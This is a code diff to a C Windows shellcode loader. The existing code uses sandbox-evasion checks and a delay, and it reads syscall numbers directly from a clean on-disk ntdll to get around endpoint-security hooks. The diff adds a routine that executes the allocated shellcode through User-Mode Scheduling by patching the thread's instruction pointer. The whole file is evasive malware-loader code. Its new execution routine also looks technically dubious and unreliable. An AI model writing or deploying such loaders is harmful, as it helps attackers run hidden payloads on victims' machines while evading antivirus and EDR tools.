@@ -44,6 +44,45 @@ void dircheck(const wchar_t* targetDir) {
         exit(-1);
     }
 }
+
+void WINAPI UmsSchedulerProc(
+    UMS_SCHEDULER_REASON reason,
+    ULONG_PTR activationPayload,
+    PVOID schedulerParam
+) {
+    if (reason == UmsSchedulerThreadYield) {
+        // Shellcode yielded or exited
+        ExitThread(0);
+    }
+}
+
+void RunShellcodeUMS(void* shellcode) {
+    PUMS_COMPLETION_LIST cl = NULL;
+    PUMS_CONTEXT ctx = NULL;
+
+    CreateUmsCompletionList(&cl);
+
+    CreateUmsThreadContext(&ctx);
+
+    // Set shellcode as the UMS thread start
+    UmsThreadYield(ctx); // initializes context
+
+    // Manually patch RIP (documented trick)
+    CONTEXT c = { 0 };
+    c.ContextFlags = CONTEXT_CONTROL;
+    GetThreadContext(GetCurrentThread(), &c);
+    c.Rip = (DWORD64)shellcode;
+    SetThreadContext(GetCurrentThread(), &c);
+
+    UMS_SCHEDULER_STARTUP_INFO si = { 0 };
+    si.UmsVersion = UMS_VERSION;
+    si.CompletionList = cl;
+    si.SchedulerProc = UmsSchedulerProc;
+
+    EnterUmsSchedulingMode(&si);
+}
+
+
 DWORD GetSyscallFromDiskClassic(const char* name){
     HMODULE cleanNtDll = LoadLibraryExA(
         "ntdll.dll",
@@ -117,7 +156,9 @@ DWORD GetSyscallFromDisk(const char* name) {
 
 void InitSyscalls(){
     g_NtAllocateVirtualMemorySyscall = GetSyscallFromDiskClassic("NtAllocateVirtualMemory");
+    printf("NtAllocateVirtualMemory: %d", g_NtAllocateVirtualMemorySyscall);
     g_NtProtectVirtualMemorySyscall = GetSyscallFromDiskClassic("NtProtectVirtualMemory");
+    printf("NtProtectVirtualMemory: %d", g_NtProtectVirtualMemorySyscall);
 }
 
 extern NTSTATUS NtAllocateVirtualMemory_syscall(
@@ -169,9 +210,9 @@ void h_ntprotectvirtualmemory(void* buf, SIZE_T size, ULONG newprotect, PULONG o
 
 int main(void){
     dircheck(L"build");
-    Sleep(10000);
+    Sleep(8000);
     InitSyscalls();
-    SIZE_T sc_size = sizeof(sc);
+    SIZE_T sc_size = sizeof(sc) - 1;
     char* buf = (char*)h_ntallocatevirtualmemory(sc_size, PAGE_READWRITE);
     printf("buf=%p\n", buf);
     if (!buf) {
@@ -194,8 +235,10 @@ int main(void){
 
 
     // this is how you execute it 
-    void (*entry)() = (void (*)())buf;
-    entry();
+   /* void (*entry)() = (void (*)())buf;
+    entry();*/
+
+	RunShellcodeUMS(buf);
 
     return 0;
 }
